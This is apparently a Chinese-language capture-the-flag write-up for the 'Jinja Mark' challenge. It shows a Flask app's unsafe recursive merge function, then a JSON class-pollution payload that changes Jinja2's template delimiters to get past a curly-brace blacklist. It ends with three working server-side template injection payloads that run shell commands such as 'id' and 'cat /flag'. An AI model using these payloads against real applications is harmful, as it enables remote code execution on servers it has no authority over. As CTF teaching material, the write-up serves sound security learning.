### Jinja Mark



```
你不会以为这里真的有flag吧？

想要flag的话先猜猜我的幸运数字

用POST方式把 lucky_number 告诉我吧，只有四位数哦

BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```



代码里面有merge函数，基本存在python原型链污染了，结合开头ban了左右花括号，我们可以尝试利用原型链污染来修改jinja2模版的属性，直接将变量取值方式改为«»从而绕过花括号的过滤

将以下json数据传入经json.loads后成功修改

| ` 1 2 3 4 5 6 7 8 9 10 11 12 ` | `{  "__init__": {    "__globals__": {      "app": {        "jinja_env": {          "variable_start_string": "<<",          "variable_end_string": ">>"        }      }    }  } } ` |
| ------------------------------ | ------------------------------------------------------------ |
|                                |                                                              |

Copy

回到index目录下进行常规ssti即可

这里我尝试了几个模块，其实方法都差不多，不过subprocess.Popen这个类本身就能够执行命令

1. warnings.catch_warnings

| `1 ` | `<<''.__class__.__mro__[1].__subclasses__()[222].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")>> ` |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

Copy

1. subprocess.Popen

| `1 ` | `<<[].__class__.__mro__[1].__subclasses__()[351]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()>> ` |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

Copy

1. os._wrap_close

| `1 ` | `<<[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()>> ` |
| ---- | ------------------------------------------------------------ |
|      |                                                              |

Copy